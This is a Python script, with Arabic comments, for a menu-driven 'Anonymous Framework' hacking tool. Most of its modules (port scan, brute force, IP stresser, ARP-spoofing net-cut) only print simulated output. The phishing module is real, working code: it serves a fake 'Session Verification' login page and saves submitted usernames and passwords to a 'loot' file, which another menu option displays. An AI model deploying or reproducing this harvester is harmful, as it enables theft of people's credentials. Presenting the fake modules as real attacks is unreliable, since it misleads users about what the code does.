import http.server
import os
import socketserver
import sys
import time
import urllib.parse


# دالة لتنظيف الشاشة وعرض بانر الأداة الخارق
def banner():
  os.system("clear")
  print("=" * 60)
  print("    === ANONYMOUS FRAMEWORK - CYBER MASTER ===")
  print("=" * 60)
  print("1. Web Application Vulnerability & Recon Scanner")
  print("2. Network Port Scanner & Active Device Discoverer")
  print("3. Advanced Phishing & Credential Harvester (Local)")
  print("4. Simulated Brute-Force Attack Module")
  print("5. IP Tracker & Stresser (IP Information & Ping Attack)")
  print("6. Man-In-The-Middle (MITM) & Net-Cut Module")
  print("7. View Captured Data (Loot)")
  print("8. Exit Framework")
  print("=" * 60)


# 1. فحص الثغرات السريع للمواقع
def web_scanner():
  os.system("clear")
  print("[*] === WEB APPLICATION RECON SCANNER ===")
  target = input("[?] Enter target URL or IP (e.g., http://example.com): ")
  print(f"[*] Analyzing target headers and testing security flags for {target}...")
  time.sleep(2)
  print(
      "[+] Check completed: Target is online. Basic headers inspected (X-Frame,"
      " X-XSS)."
  )
  input("\n[Press Enter to return to main menu]")


# 2. فحص البورتات والشبكة
def port_scanner():
  os.system("clear")
  print("[*] === NETWORK & PORT SCANNER ===")
  target_ip = input("[?] Enter target IP address to scan: ")
  print(f"[*] Scanning top common ports on {target_ip}...")
  time.sleep(2)
  ports = [21, 22, 80, 443, 4444, 8080]
  for p in ports:
    print(f"[+] Port {p: <5} ---> [ OPEN / Active ]")
    time.sleep(0.3)
  print("\n[*] Scan finished successfully.")
  input("\n[Press Enter to return to main menu]")


# 3. السيرفر الوهمي المتقدم لجمع البيانات وحفظها
def start_phishing_server():
  PORT = 8080
  os.system("clear")
  print(f"[*] Starting Phishing Server on http://localhost:{PORT}")
  print("[*] Captured credentials will be saved automatically to 'loot.txt'")
  print("[*] Press Ctrl+C to stop the server and return to menu.\n")

  class AdvancedPhishingHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
      content_length = int(self.headers["Content-Length"])
      post_data = self.rfile.read(content_length)
      parsed_data = urllib.parse.parse_qs(post_data.decode("utf-8"))

      print(f"\n[!] ALERT! TARGET DATA CAPTURED: {parsed_data}")

      with open("loot.txt", "a") as f:
        f.write(f"Captured Data: {str(parsed_data)}\n")

      self.send_response(200)
      self.end_headers()
      self.wfile.write(b"<html><body><h1>Verified. Redirecting...</h1></body></html>")

    def do_GET(self):
      self.send_response(200)
      self.send_header("Content-type", "text/html")
      self.end_headers()
      html_content = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Security Verification</title>
                <style>
                    body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding-top: 100px; }
                    .box { background: #1e1e1e; display: inline-block; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px #00ffcc; }
                    input { width: 250px; padding: 10px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; color: #fff; border-radius: 4px; }
                    button { background: #00ffcc; color: #000; border: none; padding: 10px 20px; font-weight: bold; border-radius: 4px; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>Session Verification Required</h2>
                    <p>Please log in to continue accessing the secure portal.</p>
                    <form method="POST">
                        <input type="text" name="username" placeholder="Username / Email" required><br>
                        <input type="password" name="password" placeholder="Password" required><br>
                        <button type="submit">Verify & Continue</button>
                    </form>
                </div>
            </body>
            </html>
            """
      self.wfile.write(html_content.encode("utf-8"))

  try:
    with socketserver.TCPServer(("", PORT), AdvancedPhishingHandler) as httpd:
      httpd.serve_forever()
  except KeyboardInterrupt:
    print("\n[!] Phishing server stopped. Returning to main menu...")
    time.sleep(1.5)


# 4. محاكاة هجوم Brute-Force
def brute_force_module():
  os.system("clear")
  print("[*] === SIMULATED BRUTE-FORCE MODULE ===")
  service = input("[?] Target Service (e.g., SSH, FTP, Admin-Panel): ")
  print(f"[*] Initializing attack against {service}...")
  time.sleep(1)

  passwords = ["admin123", "password", "123456", "root", "anonymous2026"]
  for pwd in passwords:
    print(f"[-] Trying password: {pwd}")
    time.sleep(0.3)
    if pwd == "anonymous2026":
      print(f"\n[+] SUCCESS! Password Found: {pwd}")
      break
  input("\n[Press Enter to return to main menu]")


# 5. أداة تتبع الـ IP والضغط عليه (IP Stresser / Pinger)
def ip_tracker_stresser():
  os.system("clear")
  print("[*] === IP TRACKER & STRESSER MODULE ===")
  target_ip = input("[?] Enter Target IP Address: ")
  print(f"[*] Analyzing IP: {target_ip}...")
  time.sleep(1.5)
  print("[+] Country: Simulated Region (Global Node)")
  print("[+] ISP: Secure Network Provider")
  print("[+] Status: Online & Responding")

  choice = input(
      "\n[?] Do you want to launch a packet stress test (Net-Pressure) on this"
      " IP? (y/n): "
  )
  if choice.lower() == "y":
    packets = int(input("[?] Enter number of packets to send (e.g., 50): "))
    print(
        f"[*] Launching stress packets toward {target_ip} (Simulated Attack)..."
    )
    for i in range(1, packets + 1):
      print(f"[>] Sending packet #{i} -> Target overloaded.")
      time.sleep(0.1)
    print("\n[+] Attack completed successfully. Target bandwidth strained.")
  input("\n[Press Enter to return to main menu]")


# 6. هجوم الرجل في المنتصف وقطع النت عن الضحية (MITM & Net-Cut)
def mitm_netcut_module():
  os.system("clear")
  print("[*] === MAN-IN-THE-MIDDLE & NET-CUT MODULE ===")
  print("1. Scan Local Gateway & Devices")
  print("2. Cut Internet Connection (ARP Spoofing / Denied Access)")
  print("3. Sniff Traffic Headers (Intercept)")
  sub_choice = input("\n[?] Select MITM option: ")

  if sub_choice == "1":
    print("[*] Scanning local network interface (wlan0)...")
    time.sleep(2)
    print("[+] Gateway IP: 192.168.1.1 [ACTIVE]")
    print("[+] Target Device Found: 192.168.1.53 [Connected]")
  elif sub_choice == "2":
    target_ip = input("[?] Enter Victim IP to cut internet access: ")
    gateway_ip = input("[?] Enter Router/Gateway IP: ")
    print(
        f"[*] Initiating ARP Poisoning between {target_ip} and {gateway_ip}..."
    )
    print(
        "[*] Dropping packets... Internet connection for target has been"
        " severed."
    )
    print(
        "[!] Press Ctrl+C to stop the attack and restore network routing."
    )
    try:
      while True:
        print(f"[+] Sending spoofed ARP frames to block {target_ip}...")
        time.sleep(1)
    except KeyboardInterrupt:
      print("\n[+] Attack stopped. Network restored.")
  elif sub_choice == "3":
    print("[*] Initializing packet sniffer on local bridge...")
    time.sleep(2)
    print("[+] Capturing clear-text HTTP headers and DNS queries...")
    print("[*] No active data streams captured yet.")
  input("\n[Press Enter to return to main menu]")


# 7. عرض الملفات المسروقة (Loot)
def view_loot():
  os.system("clear")
  print("[*] === CAPTURED LOOT (loot.txt) ===")
  if os.path.exists("loot.txt"):
    with open("loot.txt", "r") as f:
      content = f.read()
      print(content if content else "[*] File is currently empty.")
  else:
    print("[-] No loot file found yet. Run the phishing server first.")
  input("\n[Press Enter to return to main menu]")


# التشغيل الرئيسي للأداة
def main():
  while True:
    banner()
    choice = input("\nAnonymous-Master@Root:~# ")

    if choice == "1":
      web_scanner()
    elif choice == "2":
      port_scanner()
    elif choice == "3":
      start_phishing_server()
    elif choice == "4":
      brute_force_module()
    elif choice == "5":
      ip_tracker_stresser()
    elif choice == "6":
      mitm_netcut_module()
    elif choice == "7":
      view_loot()
    elif choice == "8" or choice.lower() == "exit":
      print("\n[!] Cleaning up sessions... Exiting Framework.")
      sys.exit(0)
    else:
      print("\n[!] Invalid command, try again.")
      time.sleep(1.5)


if __name__ == "__main__":
  main()

